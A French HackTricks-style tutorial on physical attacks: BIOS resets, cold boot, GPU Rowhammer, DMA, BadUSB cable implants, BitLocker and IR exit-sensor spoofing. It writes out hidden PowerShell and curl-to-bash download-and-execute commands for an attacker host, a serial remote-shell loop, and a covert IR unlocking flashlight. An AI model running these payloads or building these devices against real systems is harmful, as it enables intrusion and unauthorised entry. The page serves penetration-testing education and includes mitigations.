# Attaques physiques

{{#include ../banners/hacktricks-training.md}}

## Récupération du mot de passe BIOS et sécurité du système

Les paramètres du firmware des anciens PC peuvent être réinitialisés en débranchant la pile CMOS ou en utilisant un cavalier clear-CMOS documenté. Le temps nécessaire hors tension dépend de la carte mère, et les mots de passe ou clés UEFI modernes peuvent être stockés dans une mémoire flash non volatile, un contrôleur embarqué ou un dispositif de sécurité, et donc rester présents après le retrait de la pile. Consultez le manuel de la carte mère ou de maintenance avant de court-circuiter des broches ; cette procédure peut également invalider les mesures TPM et déclencher la récupération du chiffrement du disque.

Sur les anciens systèmes x86, des outils comme **killCMOS** et **CmosPwd** peuvent examiner ou modifier les paramètres stockés dans le CMOS depuis un environnement amorçable. CmosPwd reconnaît les formats de mots de passe d’un ensemble documenté d’anciennes familles de BIOS et peut sauvegarder, restaurer ou effacer l’état du CMOS ; ses versions publiées ciblent les environnements DOS/Windows, Linux, FreeBSD et NetBSD anciens.<sup>[[18]](#references)</sup> Ces utilitaires ne suppriment pas les mots de passe UEFI de manière générique et nécessitent un accès suffisant au matériel et au firmware.

Certains firmwares d’ordinateurs portables affichent un code de défi propre au fabricant après plusieurs tentatives de mot de passe infructueuses. Des bases de données comme [bios-pw.org](https://bios-pw.org) peuvent calculer des mots de passe de récupération hérités pour certains modèles, mais de nombreux systèmes appliquent un verrouillage sans code de défi calculable. Considérez tout mot de passe généré comme propre au modèle et évitez d’épuiser les compteurs de tentatives permanents.

### Sécurité UEFI

Pour les systèmes **UEFI** modernes, CHIPSEC peut auditer les protections des variables Secure Boot. Commencez par la vérification sans modification ci-dessous ; le mode facultatif `-a modify` tente délibérément de corrompre des variables et ne doit être utilisé que sur un système de laboratoire récupérable. CHIPSEC avertit lui-même que son pilote privilégié et son accès matériel de bas niveau ne conviennent pas aux terminaux de production.<sup>[[11]](#references)</sup>

```bash
chipsec_main -m common.secureboot.variables
# Destructive validation on a recoverable test system only:
chipsec_main -m common.secureboot.variables -a modify
```

---

## Analyse de la RAM et attaques Cold Boot

La DRAM ne perd pas immédiatement chaque bit lorsque le rafraîchissement s’arrête. Le taux de dégradation varie considérablement selon la technologie du module et la température ; le refroidissement peut préserver des données exploitables bien plus longtemps qu’un cycle de mise hors tension sans refroidissement. Une attaque cold-boot redémarre rapidement la machine dans un environnement d’acquisition minimal ou transfère un module refroidi, capture la mémoire brute et reconstitue les clés cryptographiques malgré la dégradation des bits. Un utilitaire de copie de disque n’est pas automatiquement un outil d’imagerie de la mémoire physique, et Volatility analyse une capture au lieu de l’acquérir ; utilisez un outil d’acquisition validé et adapté à la plateforme.<sup>[[12]](#references)</sup>

---

## Rowhammer GPU contre les tables de pages

Les attaques GPU Rowhammer modernes sont bien plus utiles lorsqu’elles ciblent les **métadonnées de mémoire virtuelle du GPU** plutôt que les tampons ordinaires. Des travaux récents sur les **GPU NVIDIA Ampere équipés de GDDR6** montrent qu’un attaquant exécutant du code CUDA sans privilèges peut élaborer des motifs de martèlement propres au GPU, utiliser le **massage de la mémoire** pour placer les structures de pagination dans des rangées vulnérables, puis inverser des bits dans la **table de pages de dernier niveau** ou dans un **répertoire de pages** intermédiaire. Dès qu’une seule entrée de traduction est corrompue, l’attaquant peut établir un accès en **lecture/écriture arbitraire de la mémoire GPU**, puis pivoter vers la compromission de l’hôte.<sup>[[1]](#references)[[2]](#references)</sup>

### Schéma d’exploitation

1. **Déterminer les rangées vulnérables au martèlement** dans la GDDR6 et créer des motifs de martèlement tenant compte du rafraîchissement et non uniformes qui contournent les mesures d’atténuation intégrées à la DRAM.
2. **Manipuler les allocations GPU** pour que le pilote place les structures de traduction de pages à des emplacements physiques vulnérables au martèlement, au lieu de les conserver dans le pool protégé par défaut. En pratique, cela peut consister à épuiser la région de tables de pages en mémoire basse et à disperser de grands mappages UVM clairsemés avec des pas contrôlés.
3. **Inverser des bits dans les métadonnées de traduction**, par exemple des bits **PFN** ou liés à l’aperture dans une entrée de table de pages ou de répertoire de pages, afin que la page virtuelle contrôlée par l’attaquant corresponde à des pages de tables de pages, à de la mémoire GPU arbitraire ou à des mappages système visibles par l’hôte.
4. Réutiliser le mappage forgé pour réécrire d’autres entrées de traduction et obtenir un accès en **lecture/écriture arbitraire de la mémoire GPU** entre les contextes GPU.

### Pivot vers l’hôte et mesures d’atténuation

- Lorsque l’**IOMMU est désactivé**, des mappages forgés de l’aperture système peuvent exposer au GPU n’importe quelle **mémoire physique de l’hôte**, transformant la primitive GPU en compromission complète de l’hôte.<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>
- **GDDRHammer** cible les entrées de table de pages de dernier niveau, tandis que **GeForge** montre qu’il peut être plus facile de corrompre un niveau de répertoire de pages, car une seule inversion de bit peut rediriger un sous-arbre de traduction plus vaste. Ne considérez pas une seule couche de pagination comme étant la seule critique pour la sécurité.<sup>[[1]](#references)[[2]](#references)</sup>
- L’**IOMMU** reste important, car il bloque le chemin direct vers n’importe quelle mémoire de l’hôte utilisé par GDDRHammer/GeForge, mais il ne constitue **pas une mesure d’atténuation complète**. **GPUBreach** montre un pivot en deuxième étape : l’attaquant corrompt des tampons CPU accessibles en écriture par le GPU et appartenant au pilote, puis déclenche des failles de sécurité mémoire du pilote NVIDIA pour obtenir une primitive d’écriture dans le noyau et un **shell root**, même lorsque l’IOMMU est activé.<sup>[[3]](#references)</sup>
- L’**ECC au niveau système** constitue une mesure de renforcement pratique sur les GPU de station de travail/serveur pris en charge. Les GPU grand public dépourvus d’ECC offrent une surface de défense plus faible.<sup>[[4]](#references)</sup>
- Ces attaques ne sont pas purement théoriques : **GeForge** a signalé **1 171** inversions de bits sur une RTX 3060 et **202** sur une RTX A6000, ce qui suffisait à construire une chaîne fonctionnelle d’élévation de privilèges sur l’hôte.<sup>[[2]](#references)[[9]](#references)</sup>

---

## Attaques par accès direct à la mémoire (DMA)

Pour le patching hors ligne d’UEFI IFR/NVRAM permettant d’abaisser le niveau d’application de l’IOMMU avant le démarrage et d’activer une chaîne DMA sous Windows, voir :

{{#ref}}
firmware-analysis/uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

**Inception** démontre l’acquisition et le patching de la mémoire par **DMA** via des interfaces telles que FireWire et les premières configurations Thunderbolt, y compris des signatures historiques de contournement de connexion. Il n’est pas simplement « inefficace contre Windows 10 » : l’exploitabilité dépend de l’interface, de la version cible, de la politique IOMMU, de l’état de verrouillage et de la prise en charge et de l’activation de la protection Kernel DMA de Windows. Windows 10 version 1803 et les versions ultérieures ont introduit la protection Kernel DMA sur les plateformes compatibles, modifiant considérablement la surface d’attaque.<sup>[[13]](#references)[[14]](#references)</sup>

---

## Live CD/USB pour accéder au système

Sur un volume Windows non chiffré ou déjà déverrouillé, un environnement hors ligne peut remplacer des binaires d’accessibilité tels que **sethc.exe** ou **Utilman.exe** par **cmd.exe**, ce qui ouvre une invite de commandes SYSTEM lorsque le raccourci correspondant de l’écran de connexion est utilisé. Des outils tels que **chntpw** peuvent modifier les données des comptes SAM locaux. Ces méthodes ne contournent pas un volume BitLocker verrouillé et peuvent endommager les identifiants protégés par DPAPI/EFS ; conservez des copies forensiques et des sauvegardes.

**Kon-Boot** est un outil commercial de contournement de l’authentification au démarrage pour certaines configurations Windows/macOS prises en charge. La compatibilité dépend du système d’exploitation, du mode du firmware, de Secure Boot et de la configuration du chiffrement du disque ; il ne déchiffre pas un volume BitLocker verrouillé.<sup>[[10]](#references)</sup>

---

## Gestion des fonctionnalités de sécurité de Windows

### Raccourcis de démarrage et de récupération

- **Suppr**, F2, F10 ou une autre touche propre au fabricant peut ouvrir la configuration du firmware.
- **F8** ouvre les options de démarrage avancées historiques de Windows uniquement sur les configurations où cette méthode est toujours activée ; l’accès à la récupération varie selon les versions actuelles.
- Maintenir **Shift** peut empêcher la connexion automatique à Windows sur certaines configurations, bien que les paramètres de stratégie/registre puissent désactiver ce comportement.<sup>[[17]](#references)</sup>

### Appareils BAD USB

Des appareils tels que **USB Rubber Ducky** et les cartes Teensy peuvent être reconnus comme des claviers HID de confiance et injecter des séquences de touches prédéfinies. La charge utile dispose initialement des privilèges et de l’accès au bureau de la session ouverte ; les invites UAC, le verrouillage de l’écran, la disposition du clavier, le minutage et la politique USB des terminaux imposent toujours des contraintes.<sup>[[15]](#references)</sup>

### Volume Shadow Copy

Des privilèges d’administrateur ou de sauvegarde permettent de créer une copie fantôme ou d’enregistrer les ruches du registre afin d’acquérir des fichiers verrouillés tels que **SAM** et **SYSTEM**. Il s’agit d’une technique de collecte après compromission, et non d’un contournement des privilèges ; ces opérations doivent être corrélées aux événements `diskshadow`/VSS et d’exportation de ruches du registre.

## Techniques d’implant BadUSB / HID

### Gadget HID Android déclenché par NFC

Un téléphone Android rooté peut devenir un clavier USB programmable uniquement si son contrôleur USB et son noyau prennent en charge **USB gadget/HID**. Sur les appareils compatibles, Kali NetHunter expose des profils de gadget via **USB Arsenal**. Une autre option est [USB Gadget Tool](https://github.com/tejado/android-usb-gadget), qui crée des fonctions gadget ConfigFS et peut exposer des périphériques caractère clavier/souris tels que `/dev/hidg0` et `/dev/hidg1`. L’outil crée uniquement le point de terminaison du gadget ; un processus distinct doit lui transmettre des rapports HID. L’accès root ne peut pas compenser l’absence de prise en charge de ConfigFS, du gadget HID ou d’un contrôleur de périphérique USB exploitable dans le noyau.<sup>[[19]](#references)[[20]](#references)[[21]](#references)</sup>

Ce point de terminaison peut être associé au NFC Android comme déclencheur physique. L’application [NFC-to-HID](https://github.com/androidmalware/NFC-to-HID) lit l’UID d’une étiquette, le convertit dans le format attendu, vérifie une liste d’autorisation locale et envoie une séquence clavier configurée de type Rubber Ducky après correspondance. L’hôte connecté voit une saisie clavier ordinaire et n’a besoin d’aucun logiciel NFC.<sup>[[22]](#references)[[24]](#references)</sup>

Vérifiez la reconnaissance du périphérique et la disposition du clavier dans un éditeur de texte vierge avant d’utiliser des raccourcis ou des commandes. Voici une charge utile sans danger :<sup>[[24]](#references)</sup>

```text
DELAY 1000
STRING NFC HID test successful
ENTER
```

Limites de confiance importantes :<sup>[[22]](#references)[[23]](#references)[[24]](#references)</sup>

- Une **liste blanche d’UID sert à l’identification, pas à l’authentification**. Les UID sont publics et certains types de tokens ou émulateurs permettent le clonage ou l’usurpation. Un UID autorisé copié suit le même chemin de traitement que le token d’origine.
- Le module Magisk **NfcScreenOff** modifie le service NFC pour qu’il se comporte comme si l’écran était allumé et déverrouillé. Si le téléphone est déjà connecté à un hôte, cela peut permettre à quelqu’un de déclencher le payload sans déverrouiller le téléphone.
- Les mots de passe, tokens d’API et commandes stockés dans le payload sont des secrets récupérables sur un appareil rooted ou dont le bootloader est déverrouillé. Saisir un mot de passe via HID relève de l’automatisation avec un mot de passe réutilisable, et non de l’authentification sans mot de passe.
- L’injection HID agit avec les privilèges du bureau actif et dépend du focus, du timing et de la disposition du clavier de l’hôte. Exigez une confirmation récente de l’utilisateur avant d’exécuter des actions sensibles, évitez de stocker des secrets privilégiés dans des scripts et utilisez un authentificateur à challenge-response cryptographique pour une véritable authentification.

### Implants de câble gérés par Wi-Fi

- Les implants basés sur ESP32-S3, comme **Evil Crow Cable Wind**, se dissimulent dans des câbles USB-A→USB-C ou USB-C↔USB-C, s’annoncent uniquement comme clavier USB et exposent leur stack C2 via Wi-Fi. Il suffit à l’opérateur d’alimenter le câble depuis l’hôte de la victime, de créer un hotspot nommé `Evil Crow Cable Wind` avec le mot de passe `123456789`, puis d’accéder à [http://cable-wind.local/](http://cable-wind.local/) (ou à son adresse DHCP) pour atteindre l’interface HTTP intégrée.<sup>[[8]](#references)</sup>
- L’interface du navigateur propose des onglets pour *Payload Editor*, *Upload Payload*, *List Payloads*, *AutoExec*, *Remote Shell* et *Config*. Les payloads stockés sont associés à un système d’exploitation, les dispositions de clavier sont modifiées à la volée et les chaînes VID/PID peuvent être changées pour imiter des périphériques connus.
- Comme le C2 se trouve dans le câble, un téléphone peut préparer des payloads, déclencher leur exécution et gérer les identifiants Wi-Fi sans utiliser le réseau de l’organisation — pratique pour les intrusions physiques de courte durée.

### Payloads AutoExec adaptés au système d’exploitation

- Les règles AutoExec associent un ou plusieurs payloads à exécuter immédiatement après l’énumération USB. L’implant effectue une identification légère du système d’exploitation et sélectionne le script correspondant.
- Exemple de workflow :
  - *Windows:* `GUI r` → `powershell.exe` → `STRING powershell -nop -w hidden -c "iwr http://10.0.0.1/drop.ps1|iex"` → `ENTER`.
  - *macOS/Linux:* `COMMAND SPACE` (Spotlight) ou `CTRL ALT T` (terminal) → `STRING curl -fsSL http://10.0.0.1/init.sh | bash` → `ENTER`.
- Comme l’exécution est automatique, le simple remplacement d’un câble de recharge peut permettre d’obtenir un accès initial « plug-and-pwn » dans le contexte de l’utilisateur connecté.

### Shell distant sur TCP via Wi-Fi, amorcé par HID

1. **Amorçage par frappes clavier :** un payload stocké ouvre une console et y colle une boucle qui exécute tout ce qui arrive sur le nouveau périphérique série USB. Voici une variante Windows minimale :

```powershell
$port=New-Object System.IO.Ports.SerialPort 'COM6',115200,'None',8,'One'
$port.Open(); while($true){$cmd=$port.ReadLine(); if($cmd){Invoke-Expression $cmd}}
```

2. **Cable bridge :** L’implant maintient le canal USB CDC ouvert tandis que son ESP32-S3 lance un client TCP (script Python, APK Android ou exécutable de bureau) vers l’opérateur. Tous les octets saisis dans la session TCP sont transférés vers la boucle série ci-dessus, ce qui permet l’exécution de commandes à distance, même sur des hôtes air-gapped. La sortie étant limitée, les opérateurs exécutent généralement des commandes à l’aveugle (création de comptes, déploiement d’outils supplémentaires, etc.).

### Surface de mise à jour HTTP OTA

- L’interface documentée d’Evil Crow Cable Wind expose un endpoint de mise à jour du firmware sans authentification à `/update` :<sup>[[8]](#references)</sup>

```bash
curl -F "file=@firmware.ino.bin" http://cable-wind.local/update
```

- Les opérateurs sur le terrain peuvent changer de fonctionnalité à chaud (par exemple, flasher le firmware USB Army Knife) en cours d’intervention sans ouvrir le câble, permettant ainsi à l’implant de passer à de nouvelles capacités tout en restant branché à l’hôte cible.

## Contourner le chiffrement BitLocker

Une acquisition forensique autorisée d’un système en fonctionnement ou récemment utilisé peut contenir une clé principale de volume BitLocker ou du matériel de clé associé lorsque le volume est déverrouillé. Des outils commerciaux tels qu’Elcomsoft Forensic Disk Decryptor et Passware Kit Forensic peuvent rechercher ces éléments dans les images mémoire, les fichiers d’hibernation ou les vidages sur incident pris en charge, mais le succès n’est pas garanti. Les versions modernes de Windows chiffrent également les vidages sur incident lorsque BitLocker est activé, et un mot de passe de récupération à 48 chiffres stocké est un artefact différent d’une clé de volume présente en mémoire.<sup>[[12]](#references)[[16]](#references)</sup>

---

## Ingénierie sociale pour l’ajout d’une clé de récupération

Un attaquant qui persuade un administrateur d’exécuter des commandes de gestion BitLocker peut ajouter un protecteur par mot de passe de récupération, clé externe ou autre, puis le capturer. Un mot de passe de récupération ne peut pas être une chaîne arbitraire de zéros : les mots de passe de récupération numériques BitLocker suivent un format validé de 48 chiffres. La syntaxe d’administration autorisée correspondante est `manage-bde -protectors -add C: -recoverypassword` ; listez les protecteurs obtenus avec `manage-bde -protectors -get C:`. Surveillez l’ajout de protecteurs et veillez à ce que tout nouveau matériel de récupération soit séquestré uniquement dans des emplacements approuvés.<sup>[[16]](#references)</sup>

---

## Exploiter les interrupteurs d’intrusion du châssis / de maintenance pour réinitialiser le BIOS aux paramètres d’usine

De nombreux ordinateurs portables modernes et ordinateurs de bureau compacts comprennent un **interrupteur d’intrusion du châssis** surveillé par le contrôleur embarqué (EC) et le firmware BIOS/UEFI. Si l’interrupteur sert principalement à déclencher une alerte lorsque l’appareil est ouvert, certains fabricants mettent parfois en œuvre un **raccourci de récupération non documenté**, déclenché lorsque l’interrupteur est actionné selon une séquence précise.<sup>[[5]](#references)[[6]](#references)</sup>

### Fonctionnement de l’attaque

1. L’interrupteur est relié à une **interruption GPIO** sur l’EC.
2. Le firmware exécuté sur l’EC suit le **moment et le nombre d’appuis**.
3. Lorsqu’une séquence codée en dur est reconnue, l’EC lance une routine de *mainboard-reset* qui **efface le contenu de la NVRAM/CMOS du système**.
4. Au démarrage suivant, les modèles concernés chargent l’état réinitialisé du firmware. Selon le fabricant et la révision, les éléments effacés peuvent inclure un mot de passe superviseur, des paramètres de démarrage personnalisés ou des clés Secure Boot inscrites ; l’état du TPM et les conséquences sur le chiffrement du disque doivent être évalués séparément.

> Une réinitialisation du firmware peut rétablir les options de démarrage externe, mais elle ne **déchiffre pas le stockage**. BitLocker ou un autre système de chiffrement intégral du disque peut demander une récupération après des modifications du TPM/firmware et continuer à protéger le disque interne en l’absence de clé de récupération.<sup>[[16]](#references)</sup>

### Exemple concret – ordinateur portable Framework 13

Le raccourci de récupération du Framework 13 (11e/12e/13e génération) est le suivant :

```text
Press intrusion switch  →  hold 2 s
Release                 →  wait 2 s
(repeat the press/release cycle 10× while the machine is powered)
```

Après le dixième cycle, l’EC définit un indicateur qui demande au BIOS d’effacer la NVRAM au prochain redémarrage. Toute la procédure prend environ 40 s et ne nécessite **rien d’autre qu’un tournevis**.<sup>[[5]](#references)</sup>

### Procédure d’exploitation générique

1. Allumez la cible ou sortez-la du mode veille pour que l’EC soit actif.
2. Retirez le capot inférieur pour accéder au commutateur d’intrusion/de maintenance.
3. Reproduisez la séquence d’activation propre au fabricant (consultez la documentation et les forums, ou procédez à la rétro-ingénierie du firmware de l’EC).
4. Remontez l’appareil et redémarrez-le, puis vérifiez quels paramètres du firmware et identifiants ont réellement changé.
5. Si vous y êtes autorisé et que le démarrage externe est disponible, démarrez sur une image live contrôlée. Une fois un volume interne légitimement déverrouillé (ou s’il n’a jamais été chiffré), l’environnement live peut récupérer des identifiants et des données, ou inspecter la partition EFI System. Modifier cette partition pour y installer un implant EFI est persistant et très intrusif, et reste soumis aux contraintes de Secure Boot, du measured boot, de la protection en écriture du firmware et de la surveillance des terminaux. Le stockage chiffré reste inaccessible sans sa clé ou ses données de récupération.

### Détection et atténuation

* Consignez les événements d’intrusion du châssis dans la console de gestion du système d’exploitation et mettez-les en corrélation avec les réinitialisations inattendues du BIOS.
* Utilisez des **scellés inviolables** sur les vis et les capots pour détecter toute ouverture.
* Gardez les appareils dans des **zones physiquement contrôlées** ; partez du principe qu’un accès physique équivaut à une compromission complète.
* Si cette option est disponible, désactivez la fonction « maintenance switch reset » du fabricant ou exigez une autorisation cryptographique supplémentaire pour réinitialiser la NVRAM.

---

## Injection IR furtive contre les capteurs de sortie sans contact

### Caractéristiques du capteur
- Les capteurs « wave-to-exit » du commerce associent un émetteur à LED proche infrarouge à un module récepteur de type télécommande TV qui ne signale un niveau logique haut qu’après avoir détecté plusieurs impulsions (~4–10) à la bonne fréquence porteuse (≈30 kHz).<sup>[[7]](#references)</sup>
- Un capot en plastique empêche l’émetteur et le récepteur de se faire face directement ; le contrôleur suppose donc que toute porteuse validée provient d’une réflexion à proximité et actionne un relais qui déverrouille la gâche de la porte.
- Lorsque le contrôleur détecte la présence d’une cible, il modifie souvent l’enveloppe de modulation émise, mais le récepteur continue d’accepter toute salve correspondant à la porteuse filtrée.

### Déroulement de l’attaque
1. **Capturez le profil d’émission** – branchez un analyseur logique sur les broches du contrôleur pour enregistrer les formes d’onde avant et après détection qui pilotent la LED IR interne.
2. **Ne rejouez que la forme d’onde « post-détection »** – retirez ou ignorez l’émetteur d’origine et pilotez une LED IR externe avec le motif déjà déclenché dès le départ. Comme le récepteur ne tient compte que du nombre d’impulsions et de leur fréquence, il prend la porteuse usurpée pour une réflexion réelle et active la ligne du relais.
3. **Cadencez l’émission** – transmettez la porteuse par salves réglées (par exemple, quelques dizaines de millisecondes en émission, puis une durée similaire sans émission) afin d’envoyer le nombre minimal d’impulsions sans saturer l’AGC du récepteur ni son mécanisme de gestion des interférences. Une émission continue désensibilise rapidement le capteur et empêche le relais de s’activer.

### Injection réfléchie à longue portée
- Remplacer la LED de banc par une diode IR haute puissance, un driver MOSFET et une optique de focalisation permet de déclencher le capteur de manière fiable à environ 6 m.
- L’attaquant n’a pas besoin d’être en visibilité directe de l’ouverture du récepteur ; viser des murs intérieurs, des étagères ou des encadrements de porte visibles à travers une vitre permet à l’énergie réfléchie d’entrer dans le champ de vision d’environ 30° et d’imiter un geste de la main à courte portée.
- Comme les récepteurs sont conçus pour détecter uniquement de faibles réflexions, un faisceau externe beaucoup plus puissant peut rebondir sur plusieurs surfaces tout en restant au-dessus du seuil de détection.

### Lampe torche d’attaque militarisée
- Intégrer le driver dans une lampe torche du commerce dissimule l’outil à la vue de tous. Remplacez la LED visible par une LED IR haute puissance adaptée à la bande du récepteur, ajoutez un ATtiny412 (ou un composant similaire) pour générer les salves à ≈30 kHz, et utilisez un MOSFET pour faire circuler le courant de la LED.
- Une lentille zoom télescopique concentre le faisceau pour en augmenter la portée et la précision, tandis qu’un moteur vibrant piloté par le MCU confirme par retour haptique que la modulation est active sans émettre de lumière visible.
- En faisant défiler plusieurs motifs de modulation enregistrés (fréquences porteuses et enveloppes légèrement différentes), on augmente la compatibilité avec les familles de capteurs rebadgés, ce qui permet à l’opérateur de balayer les surfaces réfléchissantes jusqu’à entendre le relais cliquer et la porte se déverrouiller.

---

## References

- [1] [GDDRHammer : perturber fortement les lignes DRAM — attaques Rowhammer inter-composants depuis des GPU modernes](https://gddr.fail/files/gddrhammer.pdf)
- [2] [GeForge : marteler la mémoire GDDR pour forger des tables de pages GPU, pour le plaisir et le profit](https://stefan1wan.github.io/files/GeForge.pdf)
- [3] [GPUBreach : attaques d’élévation de privilèges sur les GPU à l’aide de Rowhammer](https://gururaj-s.github.io/assets/pdf/SP26_GPUBreach.pdf)
- [4] [NVIDIA - Avis de sécurité : Rowhammer - juillet 2025](https://nvidia.custhelp.com/app/answers/detail/a_id/5671/~/security-notice%3A-rowhammer---july-2025)
- [5] [Pentest Partners – « Framework 13. Appuyez ici pour pwn »](https://www.pentestpartners.com/security-blog/framework-13-press-here-to-pwn/)
- [6] [FrameWiki – Guide de réinitialisation de la carte mère](https://framewiki.net/guides/mainboard-reset)
- [7] [SensePost – « Noooooooo Touch! – Contourner les capteurs IR de sortie sans contact avec une lampe torche IR furtive »](https://sensepost.com/blog/2025/noooooooooo-touch/)
- [8] [Mobile-Hacker – « Brancher, lancer, pwn : piratage avec Evil Crow Cable Wind »](https://www.mobile-hacker.com/2025/12/01/plug-play-pwn-hacking-with-evil-crow-cable-wind/)
- [9] [Bruce Schneier - Attaque Rowhammer contre les puces NVIDIA](https://www.schneier.com/blog/archives/2026/05/rowhammer-attack-against-nvidia-chips.html)
- [10] [Documentation officielle de Kon-Boot et informations de compatibilité](https://kon-boot.com/)
- [11] [Documentation de CHIPSEC - Protections des variables Secure Boot](https://chipsec.github.io/modules/chipsec.modules.common.secureboot.variables.html)
- [12] [N’oublions pas : attaques par démarrage à froid contre les clés de chiffrement](https://www.usenix.org/legacy/events/sec08/tech/full_papers/halderman/halderman.pdf)
- [13] [Inception - manipulation de la mémoire physique via DMA](https://github.com/carmaa/inception)
- [14] [Microsoft Learn - Protection du noyau contre les attaques DMA](https://learn.microsoft.com/en-us/windows/security/hardware-security/kernel-dma-protection-for-thunderbolt)
- [15] [Documentation de Hak5 USB Rubber Ducky](https://docs.hak5.org/hak5-usb-rubber-ducky/)
- [16] [Microsoft Learn - Guide des opérations BitLocker](https://learn.microsoft.com/en-us/windows/security/operating-system-security/data-protection/bitlocker/operations-guide)
- [17] [Microsoft Learn - Comportement de la touche Maj et de la connexion automatique](https://learn.microsoft.com/en-us/troubleshoot/windows-client/user-profiles-and-logon/hold-shift-key-shutting-down-not-disable-automatic-logon)
- [18] [CGSecurity - Documentation et téléchargements de CmosPwd](https://www.cgsecurity.org/wiki/CmosPwd)
- [19] [Documentation de Kali Linux - NetHunter USB-Arsenal](https://www.kali.org/docs/nethunter/nethunter-usbarsenal/)
- [20] [Documentation du noyau Linux - Pilote gadget USB HID](https://docs.kernel.org/usb/gadget_hid.html)
- [21] [Outil USB Gadget](https://github.com/tejado/android-usb-gadget)
- [22] [NFC-to-HID](https://github.com/androidmalware/NFC-to-HID)
- [23] [NfcScreenOff](https://github.com/Jon8RFC/NfcScreenOff)
- [24] [Transformer un téléphone Android rooté en authentificateur NFC et outil d’automatisation pour votre PC](https://mobile-hacker.com/2026/09/21/turn-a-rooted-android-phone-into-an-nfc-authenticator-and-automation-tool-for-your-pc/)
{{#include ../banners/hacktricks-training.md}}
